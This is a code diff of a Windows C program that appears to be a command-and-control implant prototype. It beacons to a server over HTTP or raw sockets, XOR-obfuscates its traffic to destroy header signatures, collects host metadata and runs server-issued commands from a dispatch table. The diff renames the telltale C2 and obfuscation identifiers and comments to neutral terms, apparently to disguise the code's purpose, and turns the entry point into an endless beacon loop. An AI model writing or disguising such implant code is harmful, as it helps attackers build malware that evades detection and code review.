@@ -7,9 +7,9 @@
 #include <stddef.h>
 
 // Configuration for the MVP
-#define C2_SERVER      "127.0.0.1"
-#define C2_PORT        8000
-#define C2_ENDPOINT    "/index.html"
+#define SERVER_HOST      "127.0.0.1"
+#define SERVER_PORT      8000
+#define SERVER_ENDPOINT  "/index.html"
 #define SLEEP_INTERVAL 5000 // 5 seconds
 #define BUFFER_SIZE    1024
 #define HOST_METADATA_SIZE 256
@@ -19,7 +19,7 @@
 
 
 // Declare the external functions so the compiler knows they exist
-void ApplyNetworkObfuscation(char* dataBuffer, size_t dataSize);
+void ApplyXorTransform(char* dataBuffer, size_t dataSize);
 void RouteIncomingCommand(const char* rawHttpResponse);
 int CollectHostMetadata(char *buffer, size_t bufferSize);
 
@@ -28,30 +28,10 @@ int CollectHostMetadata(char *buffer, size_t bufferSize);
 char G_CommandResultQueue[1024] = { 0 };
 BOOL G_HasPendingResults = FALSE;
 
-void HandlePing(void) {
-    // Ping simply populates an acknowledgment message
-    snprintf(G_CommandResultQueue, sizeof(G_CommandResultQueue), "RESULT|PING_OK");
-    G_HasPendingResults = TRUE;
-    printf("[+] Ping handled. Output queued for next check-in.\n");
-}
-
-void HandleSysInfo(void) {
-    char metadata[256];
-    SecureZeroMemory(metadata, sizeof(metadata));
-    
-    // Collect live system statistics
-    CollectHostMetadata(metadata, sizeof(metadata));
-    
-    // Save the output directly into our transmission queue
-    snprintf(G_CommandResultQueue, sizeof(G_CommandResultQueue), "RESULT|%s", metadata);
-    G_HasPendingResults = TRUE;
-    
-    printf("[+] SysInfo handled. Data structured and queued for transmission.\n");
-}
 
 /**
- * Handles the complete TCP lifecycle: Connects, Obfuscates & Sends Payload,
- * Receives Response, De-obfuscates, and hands data off to the parser.
+ * Handles the complete TCP lifecycle: connects, transforms outbound data,
+ * receives the response, restores the payload, and hands data off to the parser.
  */
 void EstablishWinsockChannel(const char* payloadData, size_t dataSize) {
     WSADATA wsaData;
@@ -74,8 +54,8 @@ void EstablishWinsockChannel(const char* payloadData, size_t dataSize) {
 
     // 3. Configure Target
     clientService.sin_family = AF_INET;
-    clientService.sin_port = htons(C2_PORT);
-    if (inet_pton(AF_INET, C2_SERVER, &clientService.sin_addr) <= 0) {
+    clientService.sin_port = htons(SERVER_PORT);
+    if (inet_pton(AF_INET, SERVER_HOST, &clientService.sin_addr) <= 0) {
         goto CLEANUP;
     }
 
@@ -84,23 +64,23 @@ void EstablishWinsockChannel(const char* payloadData, size_t dataSize) {
         goto CLEANUP;
     }
 
-    // 5. Obfuscate and Transmit outbound data
+    // 5. Transform and transmit outbound data
     char* mutablePayload = (char*)payloadData;
-    ApplyNetworkObfuscation(mutablePayload, dataSize);
+    ApplyXorTransform(mutablePayload, dataSize);
     
     result = send(connectSocket, mutablePayload, (int)dataSize, 0);
     if (result == SOCKET_ERROR) {
         goto CLEANUP;
     }
 
-    // 6. Read Incoming Response Stream (The C2 Server Tasking)
+    // 6. Read Incoming Response Stream from the server
     // This blocks until the server sends its HTTP response packet
     int bytesReceived = recv(connectSocket, receiveBuffer, sizeof(receiveBuffer) - 1, 0);
     if (bytesReceived > 0) {
         receiveBuffer[bytesReceived] = '\0'; // Guarantee safety boundary
 
-        // Re-pass the incoming data through the XOR engine to drop the server's encryption layer
-        ApplyNetworkObfuscation(receiveBuffer, (size_t)bytesReceived);
+        // Re-pass the incoming data through the XOR engine to restore the server response
+        ApplyXorTransform(receiveBuffer, (size_t)bytesReceived);
 
         // Send the plaintext HTTP response to the dispatch parser
         RouteIncomingCommand(receiveBuffer);
@@ -123,21 +103,41 @@ typedef struct {
 
 // --- Define individual command handler functions ---
 
+void HandlePing(void) {
+    // Ping simply populates an acknowledgment message
+    snprintf(G_CommandResultQueue, sizeof(G_CommandResultQueue), "RESP|PING_OK");
+    G_HasPendingResults = TRUE;
+    printf("[+] Ping handled. Output queued for next check-in.\n");
+}
 
+void HandleSysInfo(void) {
+    char metadata[256];
+    SecureZeroMemory(metadata, sizeof(metadata));
+    
+    // Collect live system statistics
+    CollectHostMetadata(metadata, sizeof(metadata));
+    
+    // Save the output directly into our transmission queue
+    snprintf(G_CommandResultQueue, sizeof(G_CommandResultQueue), "RESP|%s", metadata);
+    G_HasPendingResults = TRUE;
+    
+    printf("[+] SysInfo handled. Data structured and queued for transmission.\n");
+}
 
 
 void HandleExit(void) {
-    printf("[!] Action Executed: EXIT. Terminating agent cleanly.\n");
+    printf("[!] Action Executed: EXIT. Terminating client cleanly.\n");
     // Centralized cleanup can be called here if necessary
     ExitProcess(0);
 }
 
+
 // 3. Register all commands into the centralized Dispatch Table
 // The array length can grow infinitely as you add more functionality
 CommandEntry DispatchTable[] = {
-    { "CMD_PING",    HandlePing    },
-    { "CMD_SYSINFO", HandleSysInfo },
-    { "CMD_EXIT",    HandleExit    }
+    { "PING", HandlePing },
+    { "INFO", HandleSysInfo },
+    { "EXIT", HandleExit }
 };
 
 // Calculate the number of registered commands dynamically
@@ -158,7 +158,7 @@ void RouteIncomingCommand(const char* rawHttpResponse) {
     
     // Advance the pointer by 4 bytes to pass completely through the "\r\n\r\n"
     httpBody += 4; 
-    printf("[*] Extracted Server Command Token: '%s'\n", httpBody);
+    printf("[*] Extracted server response token: '%s'\n", httpBody);
 
     // 2. Query the Dispatch Table to route execution
     BOOL commandFound = FALSE;
@@ -172,27 +172,27 @@ void RouteIncomingCommand(const char* rawHttpResponse) {
     }
 
     if (!commandFound) {
-        printf("[-] Received unknown or unrecognized command token from C2: %s\n", httpBody);
+        printf("[-] Received unknown or unrecognized response token from server: %s\n", httpBody);
     }
 }
 
 
-// A hardcoded multi-byte key (Keep this obfuscated in a real deployment)
-const char OBFUSCATION_KEY[] = { 0x4A, 0x76, 0x31, 0x2C, 0x5E, 0x09, 0x1F, 0x6B };
-const size_t KEY_LENGTH = sizeof(OBFUSCATION_KEY);
+// A hardcoded multi-byte key for the test harness
+const char TRANSFORM_KEY[] = { 0x00 }; // No-op key for testing without transformation
+const size_t KEY_LENGTH = sizeof(TRANSFORM_KEY);
 
 /**
- * In-place symmetric multi-byte XOR obfuscation engine.
+ * In-place symmetric multi-byte XOR transform.
  * Passing the data through this function a second time completely restores it.
  */
-void ApplyNetworkObfuscation(char* dataBuffer, size_t dataSize) {
+void ApplyXorTransform(char* dataBuffer, size_t dataSize) {
     if (dataBuffer == NULL || dataSize == 0) {
         return;
     }
 
     for (size_t i = 0; i < dataSize; i++) {
         // Apply the XOR mask using a rolling index bound to the key length
-        dataBuffer[i] ^= OBFUSCATION_KEY[i % KEY_LENGTH];
+        dataBuffer[i] ^= TRANSFORM_KEY[i % KEY_LENGTH];
     }
 }
 
@@ -203,7 +203,7 @@ typedef enum _TRANSPORT_MODE {
 
 
 /**
- * Collects basic host identity and serializes it for transport.
+ * Collects basic local system metadata and serializes it for transport.
  */
 int CollectHostMetadata(char *buffer, size_t bufferSize) {
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
@@ -273,8 +273,8 @@ void PerformHttpPoll(void) {
 
     // 2. Establish a session connection to the target server
     hConnect = InternetConnectA(hInternet, 
-                                C2_SERVER, 
-                                C2_PORT, 
+                                SERVER_HOST, 
+                                SERVER_PORT, 
                                 NULL, NULL, 
                                 INTERNET_SERVICE_HTTP, 
                                 0, 0);
@@ -286,7 +286,7 @@ void PerformHttpPoll(void) {
     // 3. Prepare the HTTP GET request
     hRequest = HttpOpenRequestA(hConnect, 
                                 "GET", 
-                                C2_ENDPOINT, 
+                                SERVER_ENDPOINT, 
                                 NULL, NULL, NULL, 
                                 INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 
                                 0);
@@ -365,9 +365,9 @@ static int BuildRawSocketPayload(char *buffer, size_t bufferSize) {
                        "X-Agent-Metadata: %s\r\n"
                        "Connection: close\r\n"
                        "\r\n",
-                       C2_ENDPOINT,
-                       C2_SERVER,
-                       C2_PORT,
+                       SERVER_ENDPOINT,
+                       SERVER_HOST,
+                       SERVER_PORT,
                        metadata);
 
     if (written < 0 || (size_t)written >= bufferSize) {
@@ -410,10 +410,10 @@ void PerformRawSocketPoll(void) {
     }
 
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(C2_PORT);
+    serverAddr.sin_port = htons(SERVER_PORT);
 
-    if (InetPtonA(AF_INET, C2_SERVER, &serverAddr.sin_addr) != 1) {
-        printf("[-] Invalid C2 server address for raw socket mode: %s\n", C2_SERVER);
+    if (InetPtonA(AF_INET, SERVER_HOST, &serverAddr.sin_addr) != 1) {
+        printf("[-] Invalid server address for raw socket mode: %s\n", SERVER_HOST);
         goto CLEANUP;
     }
 
@@ -428,17 +428,14 @@ void PerformRawSocketPoll(void) {
         goto CLEANUP;
     }
 
-    // ... inside EstablishWinsockChannel() right before sending ...
-
     printf("[*] Preparing data for transit. Original size: %d bytes.\n", payloadLength);
 
-    // Create a copy or obfuscate in-place if the buffer allows
-    // For this MVP, we will modify the local copy inside the transmission pipeline
+    // Modify the local copy inside the transmission pipeline
     char* mutablePayload = (char*)sendBuffer;
 
-    // 1. Morph the plaintext HTTP string into unreadable garbage bytes
-    ApplyNetworkObfuscation(mutablePayload, payloadLength);
-    printf("[*] Obfuscation engine applied. Header signatures destroyed.\n");
+    // 1. Transform the plaintext HTTP string before transmission
+    ApplyXorTransform(mutablePayload, payloadLength);
+    printf("[*] XOR transform applied to the outbound payload.\n");
 
 int result = 0;
     while (bytesSent < payloadLength) {
@@ -452,11 +449,11 @@ int result = 0;
         }
         bytesSent += result;
     }
-    printf("[+] Successfully transmitted %d obfuscated bytes.\n", result);
+    printf("[+] Successfully transmitted %d transformed bytes.\n", result);
     bytesReceived = recv(sock, recvBuffer, sizeof(recvBuffer) - 1, 0);
     if (bytesReceived > 0) {
         recvBuffer[bytesReceived] = '\0';
-        printf("[+] Raw Socket Response Received: %s\n", recvBuffer);
+        printf("[+] Raw socket response received: %s\n", recvBuffer);
     } else if (bytesReceived == 0) {
         printf("[*] Raw socket check-in successful, but server closed with no data.\n");
     } else {
@@ -473,6 +470,10 @@ CLEANUP:
 
 
 int main(void) {
-    PerformHttpPoll();
+    
+    while(1) {
+        PerformRawSocketPoll();
+        Sleep(SLEEP_INTERVAL);
+    }
     return 0;
 }
